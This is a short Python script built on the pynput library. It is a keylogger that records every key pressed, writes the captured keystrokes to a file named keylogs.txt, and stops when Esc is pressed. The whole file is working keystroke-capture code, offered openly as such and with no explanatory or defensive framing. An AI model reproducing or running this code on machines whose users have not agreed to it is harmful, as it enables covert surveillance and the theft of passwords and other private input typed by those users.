from pynput.keyboard import Key,Listener
k=[]
def keypress(key):
    k.append(key)
    writef(k)
def writef(k):
    f=open("keylogs.txt","w")
    for key in k:
        #if key==Key.enter:
        #    key="\n"
        r=str(key).replace("'","")
        f.write(r)
        #f.write(" ")
def rel(key):
    if key==Key.esc:
        return False
    elif key==Key.enter:
        return True
def keylog():
    k=[]
    with Listener(on_press=keypress,on_release=rel) as listener:
        listener.join()
